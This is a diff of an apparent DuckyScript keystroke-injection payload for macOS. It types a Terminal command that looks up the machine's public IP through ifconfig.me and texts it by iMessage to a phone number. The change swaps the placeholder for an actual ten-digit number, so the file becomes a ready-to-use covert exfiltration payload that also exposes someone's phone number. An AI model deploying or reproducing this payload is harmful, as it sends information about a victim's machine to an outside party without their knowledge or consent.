@@ -1,6 +1,6 @@
 REM This script uses Mac Terminals ifconfig.me command to do a PUBLIC I.P. lookup 
 REM Then sends the I.p. to your phone via text message
-REM Replace 'ENTER PHONE NUMBER HERE' with your actual Phone number 
+REM Replace '6033079370' with your actual Phone number 
 REM Shoutout to matthewkayne and 0iphor13 for the Phone code
 
 
@@ -28,7 +28,7 @@ ENTER
 DELAY 500
 ENTER
 DELAY 500
-STRING  x=$(curl -s ifconfig.me/ip); osascript -e 'tell application "Messages" to send "'$x'" to buddy "ENTER PHONE NUMBER HERE"'
+STRING  x=$(curl -s ifconfig.me/ip); osascript -e 'tell application "Messages" to send "'$x'" to buddy "6033079370"'
 DELAY 500
 ENTER
 DELAY 4000
